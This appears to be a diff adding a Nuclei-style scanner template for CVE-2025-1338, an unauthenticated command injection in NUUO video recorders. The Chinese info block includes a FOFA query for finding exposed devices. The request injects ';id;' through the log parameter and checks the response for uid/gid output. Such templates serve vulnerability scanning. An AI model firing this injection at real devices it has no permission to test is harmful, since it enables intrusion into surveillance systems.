@@ -1,0 +1,33 @@
+id: NUUO-handle_config_php-rce-CVE-2025-1338
+
+info:
+  name: "NUUO 网络视频录像机 handle_config.php 接口远程命令执行漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: title="Network Video Recorder Login" || body="www.nuuo.com/eHelpdesk.php"
+      NUUO网络视频录像机系统中 handle_config.php 接口存在未授权远程代码执行缺陷，攻击者可利用该漏洞在目标系统上执行任意命令，导致服务控制权被完全接管。该漏洞通过特定参数注入系统命令，可实现持久化后门植入及敏感数据提取，威胁资产安全。
+  reference:
+  - https://mp.weixin.qq.com/s/IQXikNSYzOo1spUqV-rDlQ
+  tags: NUUO网络视频录像机
+
+
+http:
+- raw:
+  - |
+    GET /handle_config.php?log=;id; HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'uid='
+    - 'gid='
+    - 'Debugging Center'
+    condition: and
+  - type: status
+    status:
+    - 200
